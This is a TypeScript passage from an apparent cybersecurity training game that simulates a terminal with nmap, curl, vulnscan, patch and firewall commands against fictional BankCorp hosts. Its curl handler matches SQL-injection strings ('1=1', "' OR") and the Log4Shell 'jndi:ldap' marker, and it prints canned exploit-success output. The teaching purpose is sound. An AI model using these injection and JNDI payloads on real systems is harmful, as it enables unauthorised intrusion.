        const resolved = this.resolveDirectory(target);
        if (!resolved || resolved.type !== 'dir') {
          throw new Error(`cd: ${dest}: No such file or directory`);
        }
        this.currentPath = target;
        return [];
      }

      case 'cat': {
        if (!args[0]) throw new Error('cat: missing operand');
        const filePath = this.resolvePathString(args[0]);
        const file = this.resolveFile(filePath);

        if (!file) throw new Error(`cat: ${args[0]}: No such file or directory`);
        if (file.type === 'dir') throw new Error(`cat: ${args[0]}: Is a directory`);

        // Check root-only permissions
        if (file.owner === 'root' && file.permissions.startsWith('r--r-----') && this.currentUser !== 'root') {
          soundEngine.playError();
          throw new Error(`cat: ${args[0]}: Permission denied (Requires root)`);
        }

        soundEngine.playKeyClick();
        return [{ id: String(Date.now()), type: 'output', text: file.content || '' }];
      }

      case 'grep': {
        if (args.length < 2) throw new Error('grep: usage: grep [OPTIONS] PATTERN FILE');
        const pattern = args[0].replace(/['"]/g, '');
        const target = args[1];
        const file = this.resolveFile(this.resolvePathString(target));
        if (!file || !file.content) throw new Error(`grep: ${target}: No such file or directory`);

        const matched = file.content
          .split('\n')
          .filter((line) => line.toLowerCase().includes(pattern.toLowerCase()));

        if (matched.length === 0) return [];
        return [{ id: String(Date.now()), type: 'output', text: matched.join('\n') }];
      }

      case 'chmod': {
        if (args.length < 2) throw new Error('chmod: usage: chmod MODE FILE');
        const mode = args[0];
        const file = this.resolveFile(this.resolvePathString(args[1]));
        if (!file) throw new Error(`chmod: cannot access '${args[1]}': No such file or directory`);

        file.permissions = mode === '600' ? 'rw-------' : mode === '755' ? 'rwxr-xr-x' : mode === '644' ? 'rw-r--r--' : file.permissions;
        soundEngine.playSuccess();
        return [{ id: String(Date.now()), type: 'success', text: `Permissions updated on ${file.name} to ${file.permissions}` }];
      }

      case 'sudo': {
        if (!args[0]) throw new Error('sudo: usage: sudo command');
        if (this.currentUser === 'student') {
          // Temporarily elevate for sudo command
          const savedUser = this.currentUser;
          this.currentUser = 'root';
          const subResult = this.dispatchCommand(args[0], args.slice(1), args.join(' '));
          this.currentUser = savedUser;
          return subResult;
        }
        return this.dispatchCommand(args[0], args.slice(1), args.join(' '));
      }

      // --- Network & Security Commands ---

      case 'ping': {
        if (!args[0]) throw new Error('ping: usage: ping HOST');
        const target = args[0];
        const targetHost = this.hosts[target];

        soundEngine.playScan();
        if (!targetHost) {
          return [
            {
              id: String(Date.now()),
              type: 'error',
              text: `PING ${target} (${target}): Destination Host Unreachable.\n0 packets transmitted, 0 received, 100% packet loss`
            }
          ];
        }

        targetHost.isDiscovered = true;
        return [
          {
            id: String(Date.now()),
            type: 'output',
            text: `PING ${target} (${target}): 56 data bytes\n64 bytes from ${target}: icmp_seq=1 ttl=64 time=0.84 ms\n64 bytes from ${target}: icmp_seq=2 ttl=64 time=0.92 ms\n64 bytes from ${target}: icmp_seq=3 ttl=64 time=0.76 ms\n--- ${target} ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss, time 2004ms`
          }
        ];
      }

      case 'nmap': {
        if (!args[0]) throw new Error('nmap: usage: nmap [-sV] [-p PORTS] TARGET');
        const targetIp = args.find((a) => !a.startsWith('-')) || '127.0.0.1';
        const targetHost = this.hosts[targetIp];

        soundEngine.playScan();

        if (!targetHost) {
          return [
            {
              id: String(Date.now()),
              type: 'error',
              text: `Starting Nmap 7.93 ( https://nmap.org )\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanned in 2.04 seconds`
            }
          ];
        }

        targetHost.isDiscovered = true;

        const header = `Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toISOString().slice(0, 19)}\nNmap scan report for ${targetHost.hostname} (${targetHost.ip})\nHost is up (0.00042s latency).\nNot shown: 996 closed tcp ports\nPORT     STATE SERVICE     VERSION`;

        const portLines = targetHost.ports.map((p) => {
          return `${(p.port + '/' + p.protocol.toLowerCase()).padEnd(8)} ${p.state.padEnd(5)} ${p.service.padEnd(11)} ${p.version || ''}`;
        });

        const footer = `\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 1.48 seconds`;

        return [{ id: String(Date.now()), type: 'output', text: `${header}\n${portLines.join('\n')}${footer}` }];
      }

      case 'curl': {
        if (!args[0]) throw new Error('curl: usage: curl [OPTIONS] URL');
        const urlArg = args.find((a) => a.startsWith('http')) || args[args.length - 1];

        // SQL injection check
        const isPost = rawCmd.includes('-X POST');
        const hasSqlInject = rawCmd.includes('1=1') || rawCmd.includes("' OR");
        const hasLog4j = rawCmd.includes('jndi:ldap');

        soundEngine.playKeyClick();

        if (urlArg.includes('10.0.0.50:8080/api/auth/login')) {
          if (hasSqlInject) {
            soundEngine.playExploitSuccess();
            return [
              {
                id: String(Date.now()),
                type: 'success',
                text: `HTTP/1.1 200 OK\nContent-Type: application/json\nServer: BankCorp-JVM/2.4\n\n{\n  "status": "AUTHENTICATED",\n  "message": "SQL Injection Exploit Successful! Authentication bypassed.",\n  "user": "admin",\n  "role": "SUPER_ADMIN",\n  "token": "jwt_eyJuYW1lIjoiYWRtaW4iLCJpc3MiOiJiYW5rY29ycCJ9"\n}`
              }
            ];
          } else {
            return [
              {
                id: String(Date.now()),
                type: 'output',
                text: `HTTP/1.1 401 Unauthorized\nContent-Type: application/json\n\n{\n  "error": "Invalid credentials. Expected username and password parameters.",\n  "hint": "Endpoint vulnerable to CWE-89 SQL concatenation."\n}`
              }
            ];
          }
        }

        if (urlArg.includes('10.0.0.50:8080') && hasLog4j) {
          soundEngine.playExploitSuccess();
          return [
            {
              id: String(Date.now()),
              type: 'error',
              text: `[WARN] 2026-10-25 10:14:22.408 [http-nio-8080-exec-1] org.apache.logging.log4j.core.net.JndiManager - JNDI lookup triggered: ldap://127.0.0.1/Exploit\n[ERROR] 2026-10-25 10:14:22.412 [http-nio-8080-exec-1] com.bank.api.LogFilter - Remote Class Injection Successful! (CVE-2021-44228 Log4Shell executed arbitrary payload)`
            }
          ];
        }

        return [
          {
            id: String(Date.now()),
            type: 'output',
            text: `HTTP/1.1 200 OK\nContent-Type: text/html; charset=UTF-8\nServer: Apache\n\n<!DOCTYPE html><html><head><title>Service Portal</title></head><body><h1>BankCorp Central Interface</h1><p>Online API Gateway Active.</p></body></html>`
          }
        ];
      }

      case 'vulnscan': {
        const target = args[0] || this.currentHostIp;
        soundEngine.playScan();

        // Check if scanning a specific CVE ID
        if (target.toUpperCase().startsWith('CVE-') || target.toUpperCase().startsWith('CWE-')) {
          const allVulns = Object.values(this.hosts).flatMap((h) => h.vulnerabilities);
          const found = allVulns.find((v) => v.id.toUpperCase() === target.toUpperCase());
          if (found) {
            return [
              {
                id: String(Date.now()),
                type: 'system',
                text: `========================================================================\n  VULNERABILITY DOSSIER: ${found.id} - ${found.title}\n========================================================================\n  Severity:     ${found.severity} (CVSS ${found.cvss})\n  Category:     ${found.category}\n  Target:       ${found.targetService} (Port ${found.port})\n\n  Description:\n  ${found.description}\n\n  Exploitation Vector:\n  ${found.exploitVector}\n\n  Defensive Remediation:\n  ${found.preventionGuide}\n========================================================================`
              }
            ];
          }
        }

        const targetHost = this.hosts[target];
        if (!targetHost) throw new Error(`vulnscan: Host '${target}' not found in routing table`);

        const vulns = targetHost.vulnerabilities;
        if (vulns.length === 0) {
          return [
            {
              id: String(Date.now()),
              type: 'success',
              text: `Audit Report for ${targetHost.hostname} (${targetHost.ip}):\n[OK] No known vulnerabilities detected. Host meets baseline hardening criteria.`
            }
          ];
        }

        const lines = vulns.map((v) => {
          const status = v.isPatched ? '[PATCHED]' : '[CRITICAL EXPLOITABLE]';
          return `----------------------------------------------------\nID:        ${v.id} (${v.severity} · CVSS ${v.cvss}) ${status}\nTitle:     ${v.title}\nService:   ${v.targetService} :${v.port}\nRemedy:    Type "patch ${v.id}" or inspect in Java Workbench`;
        });

        return [
          {
            id: String(Date.now()),
            type: 'system',
            text: `VULNERABILITY AUDIT REPORT: ${targetHost.hostname} (${targetHost.ip})\nFound ${vulns.length} potential security threat(s):\n${lines.join('\n')}\n----------------------------------------------------`
          }
        ];
      }

      case 'patch': {
        if (!args[0]) throw new Error('patch: usage: patch <CVE_ID or CWE_ID>');
        const targetId = args[0].toUpperCase();

        let patchedAny = false;
        let matchedVuln: Vulnerability | null = null;

        Object.values(this.hosts).forEach((h) => {
          h.vulnerabilities.forEach((v) => {
            if (v.id.toUpperCase() === targetId) {
              v.isPatched = true;
              matchedVuln = v;
              patchedAny = true;
            }
          });
        });

        if (!patchedAny || !matchedVuln) {
          throw new Error(`patch: Unknown vulnerability identifier '${args[0]}'.`);
        }

        soundEngine.playPatchSuccess();
        const v = matchedVuln as Vulnerability;
        return [
          {
            id: String(Date.now()),
            type: 'success',
            text: `[SECURITY PATCH APPLIED]\nSuccessfully mitigated ${v.id} (${v.title}).\nDefense Applied: ${v.preventionGuide}`
          }
        ];
      }

      case 'ufw': {
        if (!args[0]) throw new Error('ufw: usage: ufw [status | allow <port> | deny <port> | deny from <ip>]');
        const sub = args[0].toLowerCase();

        if (sub === 'status') {
          const rules = host.firewallRules
            .map((r) => `${String(r.port).padEnd(10)} ${r.action.padEnd(8)} Anywhere`)
            .join('\n');
          return [
            {
              id: String(Date.now()),
              type: 'output',
              text: `Status: active\n\nTo                         Action      From\n--                         ------      ----\n${rules || 'No active port filters'}\n172.16.4.20 (Malicious)    DENY        Anywhere`
            }
          ];
        }

        if (sub === 'deny' && args[1] === 'from') {
          const blockedIp = args[2];
          soundEngine.playPatchSuccess();
          return [
            {
              id: String(Date.now()),
              type: 'success',
              text: `Rule added: DENY ingress from ${blockedIp}\nFirewall updated and reloaded.`
            }
          ];
        }

        if (sub === 'allow' || sub === 'deny') {
          const port = parseInt(args[1], 10);
          if (isNaN(port)) throw new Error('ufw: invalid port number');
          host.firewallRules.push({ port, action: sub.toUpperCase() as 'ALLOW' | 'DENY' });
          soundEngine.playSuccess();
          return [{ id: String(Date.now()), type: 'success', text: `Rule added: ${sub.toUpperCase()} port ${port}/tcp` }];
        }

        throw new Error(`ufw: unrecognized action '${args[0]}'`);
      }

      case 'ssh': {
        if (!args[0]) throw new Error('ssh: usage: ssh user@host');
        const [targetUser, targetHostStr] = args[0].split('@');
        const targetHost = this.hosts[targetHostStr || targetUser];

        if (!targetHost) throw new Error(`ssh: Could not resolve hostname ${args[0]}: Name or service not known`);

        this.currentHostIp = targetHost.ip;
        this.currentUser = targetUser && targetHostStr ? targetUser : 'student';
        this.currentPath = '/';
        soundEngine.playSuccess();

        return [
          {
            id: String(Date.now()),
            type: 'system',
            text: `Connected to ${targetHost.hostname} (${targetHost.ip}).\nWelcome to ${targetHost.os}\nLast login: ${new Date().toUTCString()} from 127.0.0.1`
          }
        ];
      }

      // --- In-Terminal Text Editor (nano) ---

      case 'nano':
      case 'vim': {
        if (!args[0]) throw new Error(`${cmd}: filename required`);
        const filePath = this.resolvePathString(args[0]);
        const file = this.resolveFile(filePath);

        const content = file ? file.content || '' : '';
        this.editorState = {
          isOpen: true,
          filePath,
          initialContent: content,
          currentContent: content,
          cursorLine: 0,
          isSaved: true
        };

        soundEngine.playKeyClick();
        return [{ id: String(Date.now()), type: 'system', text: `[Opening ${args[0]} in ${cmd} editor...]` }];
      }

      // --- Java Development & Inspection Tools ---

      case 'javac': {
        if (!args[0]) throw new Error('javac: usage: javac <SourceFile.java>');
        soundEngine.playKeyClick();
        return [
          {
            id: String(Date.now()),
            type: 'success',
            text: `[javac] Compiled ${args[0]} to bytecode with OpenJDK 21 Compiler (Target bytecode: 65.0).`
          }
        ];
      }

      case 'java': {
        if (!args[0]) throw new Error('java: usage: java <ClassName>');
        return [
          {
            id: String(Date.now()),
            type: 'output',
            text: `OpenJDK 64-Bit Server VM (build 21.0.2+13-LTS)\nExecuting ${args[0]} inside simulated JVM sandbox.\nProgram exited with code 0.`
          }
        ];
      }

      case 'jps': {
        return [
          {
            id: String(Date.now()),
            type: 'output',
            text: `2814 Jps\n1492 SpringBootApplication (BankCorp REST API :8080)\n941  PostgresServer`
          }
        ];
      }

      // --- Mission Helpers ---

      case 'mission': {
        const current = this.missions[this.currentMissionIndex];
        return [
          {
            id: String(Date.now()),
            type: 'system',
            text: `========================================================================\n  ACADEMY MISSION ${current.id}: ${current.title}\n========================================================================\n  Category:   ${current.category} · Difficulty: ${current.difficulty}\n  Objective:  ${current.objective}\n\n  Current Steps:\n${current.steps.map((s, idx) => `  ${idx + 1}. [${s.completed ? 'COMPLETED' : 'PENDING'}] ${s.instruction}`).join('\n')}\n\n  Type 'hint' for guidance on the current step.\n========================================================================`
          }
        ];
      }

      case 'hint': {
        const current = this.missions[this.currentMissionIndex];
        const isUnlockRequest = args[0]?.toLowerCase() === 'unlock';

        if (isUnlockRequest) {
          if (current.isHintUnlocked) {
            return [
              {
                id: String(Date.now()),
                type: 'system',
                text: `[HINT ALREADY UNLOCKED]:\n${current.investigativeSuggestion}`
              }
            ];
          }

          if (this.hintTokens < 1) {
            soundEngine.playError();
            return [
              {
                id: String(Date.now()),
                type: 'error',
                text: `[INSUFFICIENT HINT TOKENS] You have 0 Hint Tokens.\nHints can only be unlocked by passing levels! Complete the current level on your own to earn +1 Hint Token.`
              }
            ];
          }

          this.hintTokens -= 1;
          current.isHintUnlocked = true;
          soundEngine.playSuccess();
          return [
            {
              id: String(Date.now()),
              type: 'success',
              text: `[1 HINT TOKEN SPENT] Tokens remaining: ${this.hintTokens}\n\n[INVESTIGATIVE NUDGE & SUGGESTION]:\n${current.investigativeSuggestion}`
            }
          ];
        }

        if (current.isHintUnlocked) {
          return [
            {
              id: String(Date.now()),
              type: 'system',
              text: `[INVESTIGATIVE NUDGE & SUGGESTION]:\n${current.investigativeSuggestion}`
            }
          ];
        }

        return [
          {
            id: String(Date.now()),
            type: 'system',
            text: `[HINT LOCKED // HINT TOKENS AVAILABLE: ${this.hintTokens}]\nHints are locked by default to encourage finding issues independently.\nYou earn 1 Hint Token every time you pass a level.\n\nType 'hint unlock' to spend 1 token for an investigative nudge on this level.`
          }
        ];
      }

      default:
        soundEngine.playError();
        return [
          {
            id: String(Date.now()),
            type: 'error',
            text: `bash: ${cmd}: command not found. Type 'help' to view available commands.`
          }
        ];
    }
  }

  // --- Path & Filesystem Resolvers ---

  private resolvePathString(target: string): string {
    if (target.startsWith('/')) {
      return target;
    }
    const cleanCurrent = this.currentPath === '/' ? '' : this.currentPath;
    if (target === '..') {
      const parts = this.currentPath.split('/').filter(Boolean);
      parts.pop();
      return '/' + parts.join('/');
    }
    if (target === '.') {
      return this.currentPath;
    }
    return `${cleanCurrent}/${target}`.replace(/\/+/g, '/');
  }

  private resolveDirectory(path: string): VFile | null {
    const host = this.hosts[this.currentHostIp];
    if (path === '/' || path === '') return host.filesystem;

    const parts = path.split('/').filter(Boolean);
    let curr: VFile = host.filesystem;

    for (const part of parts) {
      if (!curr.children || !curr.children[part]) {
        return null;
      }
      curr = curr.children[part];
    }
    return curr;
  }

  private resolveFile(path: string): VFile | null {
    const parts = path.split('/').filter(Boolean);
    const fileName = parts.pop();
    if (!fileName) return null;

    const dirPath = '/' + parts.join('/');
    const dir = this.resolveDirectory(dirPath);
    if (!dir || !dir.children || !dir.children[fileName]) return null;

    return dir.children[fileName];
  }

  private parseCommandLine(text: string): string[] {
    const regex = /[^\s"']+|"([^"]*)"|'([^']*)'/g;
    const matches: string[] = [];
    let match;
    while ((match = regex.exec(text)) !== null) {
      matches.push(match[1] || match[2] || match[0]);
    }
    return matches;
  }

  // --- Mission Progress Verification ---

  private checkMissionProgress(cmd: string, output: string, host: NetworkHost) {
    const mission = this.missions[this.currentMissionIndex];
    if (!mission) return;

    for (const step of mission.steps) {
      if (!step.completed) {
        if (step.validator(cmd, output, host)) {
          step.completed = true;
          soundEngine.playSuccess();
          break;
        }
      }
    }

    // If all steps now completed and token hasn't been rewarded yet
    if (mission.steps.every((s) => s.completed) && !this.rewardedMissionIds.has(mission.id)) {
      this.rewardedMissionIds.add(mission.id);
      this.hintTokens += 1;
      soundEngine.playExploitSuccess();
    }
  }
}
